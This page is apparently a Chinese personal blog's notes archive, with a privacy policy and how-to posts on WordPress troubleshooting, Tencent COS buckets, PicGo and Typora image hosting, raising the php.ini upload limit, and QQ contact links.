<p>对于本网站的注册用户，我们也会保存用户在个人资料中提供的个人信息。所有用户可以在任何时候查看、编辑或删除他们的个人信息（除了不能变更用户名外）、站点管理员也可以查看及编辑那些信息。</p>
<h4>您对您的信息有什么权利</h4>
<p>如果您有此站点的账户，或曾经留下评论，您可以请求我们提供我们所拥有的您的个人数据的导出文件，这也包括了所有您提供给我们的数据。您也可以要求我们抹除所有关于您的个人数据。这不包括我们因管理、法规或安全需要而必须保留的数据。</p>
<h4>我们将您的信息发送到哪</h4>
<p>访客评论可能会被自动垃圾评论监测服务检查。</p>
<h4>第三方服务隐私政策</h4>
<h5>Akismet反垃圾评论服务插件</h5>
<p>我们收集关于在使用我们的Akismet反垃圾评论服务的站点处评论的访客的信息。我们收集的信息取决于用户如何为站点设置Akismet，但通常包括了评论者的<strong>IP地址、user agent、referrer及站点URL</strong>（和其他由评论者直接提供的信息如<strong>姓名、用户名、电子邮箱地址和评论内容</strong>）。</p>
<h5>Clarity</h5>
<p>本站使用微软Clarity工具分析用户访问数据，旨在提升页面设计、提高交互体验。您需要知道的信息是：</p>
<ul>
<li>Clarity是遵守《通用数据保护条例》的，详情见Microsoft隐私声明。</li>
<li>Clarity收集用户交互数据，如：<strong>页面渲染数据，用户鼠标移动、点击、滚轮等数据</strong>。详情见“Clarity收集的数据”页面。</li>
<li>收集的数据存储在微软Azure云服务。</li>
<li>Microsoft/Clarity有权访问这些数据。</li>
<li>用户不拥有不被Clarity记录的选择权。</li>
<li>Clarity不会将数据售卖出去。</li>
</ul>
<p>Clarity收集的数据：<a href="https://docs.microsoft.com/en-us/clarity/clarity-data">Clarity data Microsoft Docs</a><br>
Clarity使用条款：<a href="https://clarity.microsoft.com/terms">Microsoft Clarity - Free Heatmaps &amp; Session Recordings</a><br>
Microsoft隐私声明：<a href="https://privacy.microsoft.com/zh-CN/privacystatement">Microsoft 隐私声明 - Microsoft 隐私</a></p>
<h5>Popup Maker</h5>
<p>Cookies主要用于记录弹窗操作。这些Cookie会<strong>保留1周</strong>。</p>
<h5>百度统计</h5>
<p>本站使用了百度统计提供的统计代码。关于其隐私政策请看<a href="https://tongji.baidu.com/web/help/article?id=330&amp;type=0&amp;from_query=%E9%9A%90%E7%A7%81&amp;index=0">百度统计隐私政策 (baidu.com)</a>。</p>
<h5>开往-友链接力</h5>
<blockquote>
<p>开往是否安全？</p>
<p>安全，不侵犯隐私。全部 https 抗劫持；开源<strong>无统计代码</strong>*，不侵犯隐私；镜像自动部署，无人工干预。加入开往的网页全部经过人工筛选，确保流量从源头就是干净优质的</p>
</blockquote>
<p>“开往-友链接力”的隐私说明详看：<a href="https://github.com/travellings-link/travellings#q%E5%BC%80%E5%BE%80%E6%98%AF%E5%90%A6%E5%AE%89%E5%85%A8%E4%BC%9A%E4%B8%8D%E4%BC%9A%E4%BE%B5%E7%8A%AF%E9%9A%90%E7%A7%81">travellings-link/travellings: 开往-友链接力 (github.com)</a></p>


                
            </main>

            <footer class="list-content-container">
                

                
            </footer>
        </article>
        
        <article id="3483842810" class="record">
            <header>
                <h1 class="record-title">WordPress 前台页面空白的解决</h1>

                

                

                <div class="record-type">
                    <span>types :</span>
                    <span>博客相关, WordPress</span>
                </div>

                
                <div class="record-tags">
                    <span>keywords :</span>
                    
                    <button class="btn" onclick="activeTag('问题解决');">问题解决</button>
                    
                </div>
                

                
                <div class="record-begin">
                    <span>Begin :</span>
                    <span>3/10/2022</span>
                </div>
                

                

                
                <div class="record-description">
                    <span>description :</span>
                    <span>修改为Wordpress默认的index.php。</span>
                </div>
                
                <div class="record-cover">
                    <span>cover :</span>
                    <span>https://cdn.gallery.uuanqin.top/img/WPPIC.png</span>
                </div>
                
                <div class="record-abbrlink">
                    <span>abbrlink :</span>
                    <span>cfa738fa</span>
                </div>
                
            </header>

            <main class="record-content">
                <p>在LAMP环境搭好，且Wordpress已经安装好后，访问/wp-admin页可以正常访问。但是就是前台页面为空，或者显示了网页文件夹另一个index页面的内容。</p>
<p>当时我也意识到，这是个小得不能再小的问题，但如果对问题不理解时它有会显得很难。</p>
<p>在安装Wordpress后，默认的index.php已经在里面了。但是我的那份里面是不完整的代码，甚至注解里面还有英文“沉默是金”的字样。这时候，只要正确创建好index.php就行了。</p>
<p>正确的index.php内容（即Wordpress安装时默认内容）如下：</p>
<pre><code class="language-php">&lt;?php
/**
 * Front to the WordPress application. This file doesn't do anything, but loads
 * wp-blog-header.php which does and tells WordPress to load the theme.
 *
 * @package WordPress
 */

/**
 * Tells WordPress to load the WordPress theme and output it.
 *
 * @var bool
 */
define('WP_USE_THEMES', true);

/** Loads the WordPress Environment and Template */
require('./wp-blog-header.php');
?&gt;
</code></pre>
<p>注意，Wordpress设置里站点位置不要弄错。</p>
<p>参考：<a href="https://ryans.dream.press/wordpress-2/default-wordpress-index-php-file/#:~:text=Default%20WordPress%20index.php%20code%20.%20This%20is%20the,fresh%20copy%20of%20the%20index.php%20file%20for%20WordPress.">Default WordPress index.php file – Ryan's Guides (dream.press)</a></p>


                
            </main>

            <footer class="list-content-container">
                

                
            </footer>
        </article>
        
        <article id="1151366136" class="record">
            <header>
                <h1 class="record-title">使用对象存储产品</h1>

                

                

                <div class="record-type">
                    <span>types :</span>
                    <span>工具箱, 核心协同</span>
                </div>

                
                <div class="record-tags">
                    <span>keywords :</span>
                    
                    <button class="btn" onclick="activeTag('COS');">COS</button>
                    
                    <button class="btn" onclick="activeTag('腾讯云');">腾讯云</button>
                    
                    <button class="btn" onclick="activeTag('step-by-step');">step-by-step</button>
                    
                    <button class="btn" onclick="activeTag('对象存储');">对象存储</button>
                    
                </div>
                

                
                <div class="record-begin">
                    <span>Begin :</span>
                    <span>3/12/2022</span>
                </div>
                

                

                
                <div class="record-description">
                    <span>description :</span>
                    <span>保姆级指导对象存储云产品的使用</span>
                </div>
                
                <div class="record-abbrlink">
                    <span>abbrlink :</span>
                    <span>44a073f8</span>
                </div>
                
                <div class="record-cover">
                    <span>cover :</span>
                    <span></span>
                </div>
                
            </header>

            <main class="record-content">
                <blockquote>
<p>[!Notice] 文章重组提示<br>
本文由文章《PicGo(app) 配置腾讯云 COS 图床》（于 2022 年 3 月 12 创作）解耦而来。</p>
</blockquote>
<p>网站建设或写笔记的时候，我们可能需要一个存储桶存放图片，这样网络上的任何人都可以访问。</p>
<p>本文演示腾讯云对象存储产品COS的使用，以及公有读私有写存储桶的创建步骤。</p>
<h1>购买腾讯云对象存储 COS 产品</h1>
<p><img src="https://cdn.gallery.uuanqin.top/img/image-1024x293.png" alt="|520"></p>
<p>首先登录腾讯云账户，直接微信扫一扫就行了。</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/imagasde-1.png" alt="|325"></p>
<p>登录后找到对象存储的相关页面</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/imagewed-2.png" alt="|450"></p>
<p>根据需要进行选购</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/image-3-102s4x452.png" alt=""></p>
<p>我当时是参与了一个新用户的活动，实名认证后 1 块钱得标准存储容量-50G, 12 个月。随便点点又送了一些资源包。总的来说还是挺划算的。</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/imagesa-4.png" alt=""></p>
<p>购买成功后来到控制台：<a href="https://console.cloud.tencent.com/cos/bucket">存储桶列表 - 对象存储 - 控制台 (tencent.com)</a></p>
<p>控制台在这里：</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/image-27-1024xs144.png" alt=""></p>
<p>在云产品菜单下找对象存储的控制台：</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/imagse-28.png" alt=""></p>
<p>在存储桶列表一栏新建存储桶。</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/image-s5.png" alt=""></p>
<p>按图片中的步骤进行填写</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/image-s6.png" alt=""></p>
<p>后续直接点下一步、创建，即可。</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/image-7-1024x573.png" alt=""></p>
<p>进入这个新的存储桶后，创建一个新的文件夹，专门用于存储图片（可选步骤）</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/image-8-1024x430.png" alt=""></p>
<p>第三步到这里就完成了！如果之前存储桶的访问权限设错了，可以点击存储桶，在这里改：</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/%E6%94%B9%E6%9D%83%E9%99%90-1024x451.png" alt=""></p>
<h1>COS 权限配置</h1>
<p>这个步骤用于配置用户权限。</p>
<p>打开访问管理页。在用户列表下新建用户</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/imasge-9.png" alt=""></p>
<p><img src="https://cdn.gallery.uuanqin.top/img/image-10s.png" alt=""></p>
<p>选择自定义创建</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/image-1s1.png" alt=""></p>
<p>按步骤设置：</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/imsage-12.png" alt=""></p>
<p><img src="https://cdn.gallery.uuanqin.top/img/imagse-13.png" alt=""></p>
<p>用户权限这一步需要在搜索框搜索相应权限。</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/image-14-1024x508.png" alt=""></p>
<p>最后再确认信息即可。</p>


                
            </main>

            <footer class="list-content-container">
                

                
                <details class="record-backlinks" open="open">
                    <summary class="menu-title">
                        backlinks
                        <span class="badge">1</span>
                    </summary>

                    <ul class="record-backlinks-list">
                        
                        <li data-target-id="3992879191">
                            <a href="#3992879191">
                                <span class="record-type-points">
                                    
                                    <span style="color: var(--n_工具箱);">⬤</span>
                                    
                                    <span style="color: var(--n_核心协同);">⬤</span>
                                    
                                </span>
                                
                                <span>PicGo(app) 配置腾讯云 COS 图床</span>
                                
                                <div class="record-links-context hover">
                                    <p>详看：<a href="#1151366136" title="使用对象存储产品" class="record-link highlight">使用对象存储产品</a>（腾讯云 COS）</p>

                                </div>
                                
                            </a>
                        </li>
                        
                    </ul>
                </details>
                
            </footer>
        </article>
        
        <article id="3992879191" class="record">
            <header>
                <h1 class="record-title">PicGo(app) 配置腾讯云 COS 图床</h1>

                

                

                <div class="record-type">
                    <span>types :</span>
                    <span>工具箱, 核心协同</span>
                </div>

                
                <div class="record-tags">
                    <span>keywords :</span>
                    
                    <button class="btn" onclick="activeTag('COS');">COS</button>
                    
                    <button class="btn" onclick="activeTag('PicGo');">PicGo</button>
                    
                    <button class="btn" onclick="activeTag('图床');">图床</button>
                    
                    <button class="btn" onclick="activeTag('实现');">实现</button>
                    
                    <button class="btn" onclick="activeTag('腾讯云');">腾讯云</button>
                    
                    <button class="btn" onclick="activeTag('step-by-step');">step-by-step</button>
                    
                </div>
                

                
                <div class="record-begin">
                    <span>Begin :</span>
                    <span>3/12/2022</span>
                </div>
                

                

                
                <div class="record-description">
                    <span>description :</span>
                    <span>保姆级解释PicGo配置腾讯云的步骤。</span>
                </div>
                
                <div class="record-abbrlink">
                    <span>abbrlink :</span>
                    <span>edfe8057</span>
                </div>
                
                <div class="record-cover">
                    <span>cover :</span>
                    <span></span>
                </div>
                
            </header>

            <main class="record-content">
                <p>PicGo 是图床管理的开源软件，以 PicGo 为窗口使用 COS 作为图床将使我们更好的对图片进行管理。</p>
<p>利用 PicGo，我们在使用 Typora、Obsidian[^osd] 等编辑器编写 Markdown 文档时将更为方便。</p>
<p>[^osd]: <a href="#85495977" title="构建 Obsidian 的 Hexo 写作工作流" class="record-link ">构建 Obsidian 的 Hexo 写作工作流</a></p>
<h1>安装 PicGo（App）</h1>
<p>这里我选择安装 PicGo 应用进行实现，如果选择 PicGo-Core（Command line），可参考 <a href="https://www.cnblogs.com/locustree/p/15371982.html">Typora+picGo-core+云对象存储+以时间戳命名图片存储 - 槐下 - 博客园 (cnblogs.com)</a> 。</p>
<p>官网安装：<a href="https://molunerfinn.com/PicGo/">PicGo (molunerfinn.com)</a></p>
<p>我这里安装的是 PicGo - 2.3.0 版本。通过一般途径从 GitHub 上安装，速度巨慢！想直接下载的点链接：<a href="https://www.aliyundrive.com/s/hG2B4onmYNv">https://www.aliyundrive.com/s/hG2B4onmYNv</a></p>
<h1>拥有对象存储产品并配置存储桶</h1>
<p>详看：<a href="#1151366136" title="使用对象存储产品" class="record-link ">使用对象存储产品</a>（腾讯云 COS）</p>
<h1>配置 PicGo</h1>
<p>进入密钥管理，记录<strong>APPID、SecretID、SecretKey</strong>。</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/image-15-1024x714.png" alt=""></p>
<p>返回刚才存储桶页面，记录存储桶信息：</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/image-16-1024x422.png" alt=""></p>
<p>这里的地域信息就是像<strong>ap-nanjing</strong>这种。</p>
<p>打开 PicGo（APP），把刚才记录的信息填写进去。</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/imag9e-17.png" alt=""></p>
<blockquote>
<p>[!Hint] 版本提示<br>
PicGo 2.3.0 版本的配置中容易忽略对 COS 版本的选择，它是区分“左”“右”的。目前新版本改为下拉框，不存在 UI 歧义问题。</p>
</blockquote>
<p>然后就 OK 了。你可以拖几张图片测试一下。</p>
<h1>额外提醒</h1>
<p>如果 COS 采用 CDN 加速，PicGo 可通过填写自定义域名进行设置。</p>


                
            </main>

            <footer class="list-content-container">
                
                <details class="record-links" open="open">
                    <summary class="menu-title">
                        links
                        <span class="badge">2</span>
                    </summary>

                    <ul class="record-links-list">
                        
                        <li data-target-id="85495977">
                            <a href="#85495977">
                                <span class="record-type-points">
                                    
                                    <span style="color: var(--n_工具箱);">⬤</span>
                                    
                                    <span style="color: var(--n_核心协同);">⬤</span>
                                    
                                </span>
                                
                                <span>构建 Obsidian 的 Hexo 写作工作流</span>
                                
                                <div class="record-links-context hover">
                                    <p>[^osd]: <a href="#85495977" title="构建 Obsidian 的 Hexo 写作工作流" class="record-link highlight">构建 Obsidian 的 Hexo 写作工作流</a></p>
<h1>安装 PicGo（App）</h1>

                                </div>
                                
                            </a>
                        </li>
                        
                        <li data-target-id="1151366136">
                            <a href="#1151366136">
                                <span class="record-type-points">
                                    
                                    <span style="color: var(--n_工具箱);">⬤</span>
                                    
                                    <span style="color: var(--n_核心协同);">⬤</span>
                                    
                                </span>
                                
                                <span>使用对象存储产品</span>
                                
                                <div class="record-links-context hover">
                                    <p>详看：<a href="#1151366136" title="使用对象存储产品" class="record-link highlight">使用对象存储产品</a>（腾讯云 COS）</p>

                                </div>
                                
                            </a>
                        </li>
                        
                    </ul>
                </details>
                

                
                <details class="record-backlinks" open="open">
                    <summary class="menu-title">
                        backlinks
                        <span class="badge">2</span>
                    </summary>

                    <ul class="record-backlinks-list">
                        
                        <li data-target-id="377267818">
                            <a href="#377267818">
                                <span class="record-type-points">
                                    
                                    <span style="color: var(--n_工具箱);">⬤</span>
                                    
                                    <span style="color: var(--n_核心协同);">⬤</span>
                                    
                                </span>
                                
                                <span>Typora 应用 PicGo(app) 使用图床</span>
                                
                                <div class="record-links-context hover">
                                    <p>请移步这篇文章 <a href="#3992879191" title="PicGo(app) 配置腾讯云 COS 图床" class="record-link highlight">PicGo(app) 配置腾讯云 COS 图床</a></p>

                                </div>
                                
                            </a>
                        </li>
                        
                        <li data-target-id="85495977">
                            <a href="#85495977">
                                <span class="record-type-points">
                                    
                                    <span style="color: var(--n_工具箱);">⬤</span>
                                    
                                    <span style="color: var(--n_核心协同);">⬤</span>
                                    
                                </span>
                                
                                <span>构建 Obsidian 的 Hexo 写作工作流</span>
                                
                                <div class="record-links-context hover">
                                    <p>[^图床配置教程]: <a href="#3992879191" title="PicGo(app) 配置腾讯云 COS 图床" class="record-link highlight">PicGo(app) 配置腾讯云 COS 图床</a></p>

                                </div>
                                
                            </a>
                        </li>
                        
                    </ul>
                </details>
                
            </footer>
        </article>
        
        <article id="377267818" class="record">
            <header>
                <h1 class="record-title">Typora 应用 PicGo(app) 使用图床</h1>

                

                

                <div class="record-type">
                    <span>types :</span>
                    <span>工具箱, 核心协同</span>
                </div>

                
                <div class="record-tags">
                    <span>keywords :</span>
                    
                    <button class="btn" onclick="activeTag('PicGo');">PicGo</button>
                    
                    <button class="btn" onclick="activeTag('Typora');">Typora</button>
                    
                    <button class="btn" onclick="activeTag('图床');">图床</button>
                    
                    <button class="btn" onclick="activeTag('实现');">实现</button>
                    
                    <button class="btn" onclick="activeTag('step-by-step');">step-by-step</button>
                    
                </div>
                

                
                <div class="record-begin">
                    <span>Begin :</span>
                    <span>3/12/2022</span>
                </div>
                

                

                
                <div class="record-description">
                    <span>description :</span>
                    <span>Typora 联动 PicGo APP 实现图床。简单、有效、花费少。</span>
                </div>
                
                <div class="record-abbrlink">
                    <span>abbrlink :</span>
                    <span>167ca66a</span>
                </div>
                
                <div class="record-cover">
                    <span>cover :</span>
                    <span>https://cdn.gallery.uuanqin.top/img/20240612221122.webp</span>
                </div>
                
            </header>

            <main class="record-content">
                <p>每次使用 Typora，最麻烦的就是图片插入问题。稍微改个路径，或不小心把图删除，图就挂了。虽说新增一个文件夹，用来专门放置某个 Markdown 文档中的图片是一个方法，但是这未免也太麻烦。</p>
<p>现介绍 PicGo APP 配合 Typora 的使用，可以直接拖拽图片进入 Markdown 文档，无需另外找地方保存图片的方法。整个过程顺畅且优雅~（如需通过其他方式实现，请直接查看最后的参考链接）</p>
<p>具体实现步骤如下。</p>
<h1>拥有 PicGo 并配置图床</h1>
<p>请移步这篇文章 <a href="#3992879191" title="PicGo(app) 配置腾讯云 COS 图床" class="record-link ">PicGo(app) 配置腾讯云 COS 图床</a></p>
<h1>安装 Typora</h1>
<p>官网下载：<a href="https://www.typora.net/">TyporaTypora 中文 typora 下载 typora 主题</a></p>
<p>Typora 是 Markdown 的文件编辑器，秉承”所见即所得“的特点，深受大家的喜爱。它简洁且免费（beta 版本）。</p>
<p>Typora 正式版发布之后，就需要收费了，不过作者也并不限制历史版本的下载，以前版本的下载链接还可以找到。</p>
<p>打开 Typora。（<a href="http://xn--4gqvdz8cd00ap9ltmp9m5cfhl.md">就是随便点进一个.md</a> 文件，或者新建一个.txt，<a href="http://xn--siqw5l25ntscyw0c.md">把后缀改为.md</a> 再用 Typora 打开就行），打开偏好设置：</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/image-18-editeed.png" alt=""></p>
<p>设置就按照下面图片那样设置</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/image-1r9.png" alt=""></p>
<p><img src="https://cdn.gallery.uuanqin.top/img/imagse-20.png" alt=""></p>
<p>路径选择 PicGo 安装目录下的可执行文件。然后再进行验证。</p>
<p>如果出现下图的结果，则说明验证成功：</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/image-2d1.png" alt=""></p>
<p>如果出现失败，比如下面的例子。记得检查前面的步骤是否做好，特别是参数配置部分。</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/%E5%A4%B1%E8%B4%A51.png" alt=""></p>
<p>Typora 的提示</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/image-24-1024x300.png" alt=""></p>
<p>（日志内容）</p>
<p>如果出现问题记得仔细查阅 PicGo 的配置手册：<a href="https://picgo.github.io/PicGo-Doc/zh/guide/config.html#%E8%85%BE%E8%AE%AF%E4%BA%91cos">配置手册 PicGo</a></p>
<h1>成果展示</h1>
<p>拖拽图片进入 Typora，图片将自动上传。</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/image-2s2.png" alt=""></p>
<p>图片上传中</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/image-2s3.png" alt=""></p>
<p>上传成功。</p>
<h1>参考链接</h1>
<ul>
<li>最近才发现官方的教程：<a href="https://cloud.tencent.com/document/product/436/74373">对象存储 使用 PicGo+Typora+COS 搭建图床服务-最佳实践-文档中心-腾讯云 (tencent.com)</a></li>
<li>Sfgg 采用 PicGo-core 进行配置，并对图片进行了重命名 <a href="https://www.cnblogs.com/locustree/p/15371982.html">Typora+picGo-core+云对象存储+以时间戳命名图片存储 - 槐下 - 博客园 (cnblogs.com)</a>。</li>
<li><a href="https://blog.csdn.net/qq_37924905/article/details/118440244">typora+picGo+阿里云对象存储 OSS 和 typora+picGo+gitee 的相关配置_水巷石子的博客-CSDN 博客</a> 这篇文章采用了阿里云的对象存储，许多操作大同小异。我基本是仿照着它来的。</li>
<li><a href="https://baijiahao.baidu.com/s?id=1722650278458327580&amp;wfr=spider&amp;for=pc">解决 typora picgo 图片上传失败问题 (baidu.com)</a> 这篇文章采用了 <a href="http://SM.MS">SM.MS</a> 图床，官网：<a href="https://sm.ms/">Image Upload - SM.MS - Simple Free Image Hosting</a>。更多图床的使用方法在 PicGo 的配置手册里都有：<a href="https://picgo.github.io/PicGo-Doc/zh/guide/config.html#%E5%9B%BE%E5%BA%8A%E5%8C%BA">配置手册 PicG</a></li>
</ul>


                
            </main>

            <footer class="list-content-container">
                
                <details class="record-links" open="open">
                    <summary class="menu-title">
                        links
                        <span class="badge">1</span>
                    </summary>

                    <ul class="record-links-list">
                        
                        <li data-target-id="3992879191">
                            <a href="#3992879191">
                                <span class="record-type-points">
                                    
                                    <span style="color: var(--n_工具箱);">⬤</span>
                                    
                                    <span style="color: var(--n_核心协同);">⬤</span>
                                    
                                </span>
                                
                                <span>PicGo(app) 配置腾讯云 COS 图床</span>
                                
                                <div class="record-links-context hover">
                                    <p>请移步这篇文章 <a href="#3992879191" title="PicGo(app) 配置腾讯云 COS 图床" class="record-link highlight">PicGo(app) 配置腾讯云 COS 图床</a></p>

                                </div>
                                
                            </a>
                        </li>
                        
                    </ul>
                </details>
                

                
                <details class="record-backlinks" open="open">
                    <summary class="menu-title">
                        backlinks
                        <span class="badge">1</span>
                    </summary>

                    <ul class="record-backlinks-list">
                        
                        <li data-target-id="1135491326">
                            <a href="#1135491326">
                                <span class="record-type-points">
                                    
                                    <span style="color: var(--n_工具箱);">⬤</span>
                                    
                                    <span style="color: var(--n_核心协同);">⬤</span>
                                    
                                </span>
                                
                                <span>Typora 免费版本 or 正式版的绿色使用</span>
                                
                                <div class="record-links-context hover">
                                    <ul>
<li>开始菜单栏右键菜单中新建「Markdown」文件</li>
<li>Typora 集成图床：<a href="#377267818" title="Typora 应用 PicGo(app) 使用图床" class="record-link highlight">Typora 应用 PicGo(app) 使用图床</a></li>
</ul>

                                </div>
                                
                            </a>
                        </li>
                        
                    </ul>
                </details>
                
            </footer>
        </article>
        
        <article id="2653327377" class="record">
            <header>
                <h1 class="record-title">WordPress 上传的文件大小超过定义值问题解决</h1>

                

                

                <div class="record-type">
                    <span>types :</span>
                    <span>博客相关, WordPress</span>
                </div>

                
                <div class="record-tags">
                    <span>keywords :</span>
                    
                    <button class="btn" onclick="activeTag('PHP');">PHP</button>
                    
                    <button class="btn" onclick="activeTag('问题解决');">问题解决</button>
                    
                </div>
                

                
                <div class="record-begin">
                    <span>Begin :</span>
                    <span>3/13/2022</span>
                </div>
                

                

                
                <div class="record-description">
                    <span>description :</span>
                    <span>找到php.ini文件并修改相应数值。</span>
                </div>
                
                <div class="record-cover">
                    <span>cover :</span>
                    <span>https://cdn.gallery.uuanqin.top/img/WPPIC.png</span>
                </div>
                
                <div class="record-abbrlink">
                    <span>abbrlink :</span>
                    <span>9e269011</span>
                </div>
                
            </header>

            <main class="record-content">
                <p>我在上传 Wordpress 插件时出现了错误：</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/%E9%94%99%E8%AF%AFd1.png" alt=""></p>
<p>根据它的提示找到以下解决方法：</p>
<p>打开 Linux 服务器命令行，找到这个文件所在目录：</p>
<pre><code class="language-bash">find / -name php.ini
</code></pre>
<p>使用 vim 编辑 upload_max_filesize 的值：</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/image-d25.png" alt=""></p>
<p>保存后退出。</p>
<p>重启 Apache 和 php-fpm 即可。</p>
<pre><code class="language-bash"> service httpd restart
 service php-fpm restart
</code></pre>
<p><img src="https://cdn.gallery.uuanqin.top/img/image-2d6.png" alt=""></p>
<h1>本文参考</h1>
<ul>
<li><a href="https://www.suxing.me/wp-courses/1336.html">WordPress 上传的文件尺寸超过 php.ini 中定义的 upload_max_filesize 值解决方法 - 苏醒 (suxing.me)</a></li>
<li><a href="https://www.cnblogs.com/lvfish/p/10248835.html">linux 下 apache 停止、重启等操作 - LvFish - 博客园 (cnblogs.com)</a></li>
</ul>


                
            </main>

            <footer class="list-content-container">
                

                
            </footer>
        </article>
        
        <article id="1881411089" class="record">
            <header>
                <h1 class="record-title">关于 QQ 聊天发起与 QQ 邮箱即时写信的链接-即时沟通外链</h1>

                

                

                <div class="record-type">
                    <span>types :</span>
                    <span>Archive, undefined</span>
                </div>

                
                <div class="record-tags">
                    <span>keywords :</span>
                    
                    <button class="btn" onclick="activeTag('QQ');">QQ</button>
                    
                    <button class="btn" onclick="activeTag('QQ邮箱');">QQ邮箱</button>
                    
                    <button class="btn" onclick="activeTag('实现');">实现</button>
                    
                </div>
                

                
                <div class="record-begin">
                    <span>Begin :</span>
                    <span>3/13/2022</span>
                </div>
                

                

                
                <div class="record-description">
                    <span>description :</span>
                    <span>即时沟通外链。添加QQ、邮箱外链的做法。</span>
                </div>
                
                <div class="record-abbrlink">
                    <span>abbrlink :</span>
                    <span>70240e11</span>
                </div>
                
                <div class="record-cover">
                    <span>cover :</span>
                    <span>https://cdn.gallery.uuanqin.top/img/new-out-of-date-cover.png</span>
                </div>
                
            </header>

            <main class="record-content">
                <blockquote>
<p>[!warning] 这是一篇过期文章[2023.05.03]<br>
本篇文章已过期。</p>
<ul>
<li>由于 <em>QQ 推广</em> 产品策略调整，即时沟通外链已不可用</li>
<li>QQ 邮我功能目前还在设置，但点击链接已达不到想要的效果</li>
</ul>
</blockquote>
<p>网页中插入联系方式，可以直接写下 QQ 号和微信号，也可以放二维码。不过，我印象中还有一种更快、更便捷的方式，就是通过即时沟通外链（反正我没想到什么好词）直接打开聊天窗口或发信窗口。微信暂时弄不了，这里就先提供 QQ 和 QQ 邮箱的方法。</p>
<h4>一、先上答案</h4>
<p>发起 QQ 聊天的链接：</p>
<pre><code>http://wpa.qq.com/msgrd?v=3&amp;uin=&lt;your_QQ_number&gt;&amp;site=qq&amp;menu=ye
</code></pre>
<p>发起 QQ 邮箱的写信功能：</p>
<pre><code>https://mail.qq.com/cgi-bin/qm_share?t=qm_mailme&amp;email=&lt;your_mail&gt;
</code></pre>
<p>注意：&lt;your_QQ_number&gt;，&lt;your_mail&gt;部分是自己账号的可替换内容。发起 QQ 聊天时需要注意电脑上已经登录好自己的 QQ 了。QQ 邮箱写信最好是在网页端已经登陆过 QQ 邮箱的情况下使用。</p>
<p>上面这些功能本质就是平台对外公布的组件。即使是这样，我光是找就找了好久。毕竟这些功能在上个 10+年推出的。光看官方网页和指导也能知道多久没有维护了。</p>
<p>接下来的部分就详细探讨我所发现的更多相关内容。</p>
<h4>二、QQ 推广</h4>
<p>官网：<a href="https://shang.qq.com/v3/widget.html">QQ 推广</a></p>
<p>看官方给出的代码，提取链接利用就行。</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/image-20230503192749818.png" alt="image-20230503192749818"></p>
<p>试试代码：</p>
<blockquote>
<p>[!warning] 此处出现了链接格式错误[2023.09.30]<br>
可能由于Obsidian的更新，把形如<code>&lt;a&gt;&lt;img /&gt;&lt;/a&gt;</code>的HTML自主替换为**[![]()]()**的形式。从而又导致某些Hexo渲染器渲染出错。因此现把出错部分用代码块框起来。（反正这东西过时了，原图片你也预览不到了）</p>
</blockquote>
<pre><code>[![点击这里给我发消息](http://wpa.qq.com/pa?p=2:2472963374:52 &quot;点击这里给我发消息&quot;)](http://wpa.qq.com/msgrd?v=3&amp;uin=2472963374&amp;site=qq&amp;menu=yes)

[![点击这里给我发消息](http://wpa.qq.com/pa?p=2:2472963374:51 &quot;点击这里给我发消息&quot;)](http://wpa.qq.com/msgrd?v=3&amp;uin=2472963374&amp;site=qq&amp;menu=yes)

[![点击这里给我发消息](http://wpa.qq.com/pa?p=2:2472963374:53 &quot;点击这里给我发消息&quot;)](http://wpa.qq.com/msgrd?v=3&amp;uin=2472963374&amp;site=qq&amp;menu=yes)
</code></pre>
<p>效果是这样的：</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/imageee-36.png" alt=""></p>
<h4>三、QQ 邮箱-邮我</h4>
<p>QQ 邮箱首页：<a href="http://mail.qq.com">mail.qq.com</a></p>
<p>QQ 邮箱也有相应的组件，设置方法如下图所示：</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/imagse-30.png" alt=""></p>
<p><img src="https://cdn.gallery.uuanqin.top/img/imagse-31.png" alt=""></p>
<p><img src="https://cdn.gallery.uuanqin.top/img/image-3s2.png" alt=""></p>
<p><img src="https://cdn.gallery.uuanqin.top/img/image-as33.png" alt=""></p>
<p>点击“获取代码”，得到以下代码：</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/image-s34.png" alt=""></p>
<p>可以发现，地址的部分是这样的：</p>
<p><a href="http://mail.qq.com/cgi-bin/qm_share?t=qm_mailme&amp;email=bRoaHF9dX1wtCwIVAAwEAUMOAgA">http://mail.qq.com/cgi-bin/qm_share?t=qm_mailme&amp;email=bRoaHF9dX1wtCwIVAAwEAUMOAgA</a></p>
<p>但是这个链接有一个不好的地方，就是用户的登录状态没有同步过来，导致需要重新点击登录入口进行登录，并且还会跳转到登录用户的邮箱首页，这样就把收信人给弄丢了。</p>
<p>效果如下：</p>
<p><a href="http://mail.qq.com/cgi-bin/qm_share?t=qm_mailme&amp;email=bRoaHF9dX1wtCwIVAAwEAUMOAgA"><img src="http://rescdn.qqmail.com/zh_CN/htmledition/images/function/qm_open/ico_mailme_22.png" alt=""></a></p>
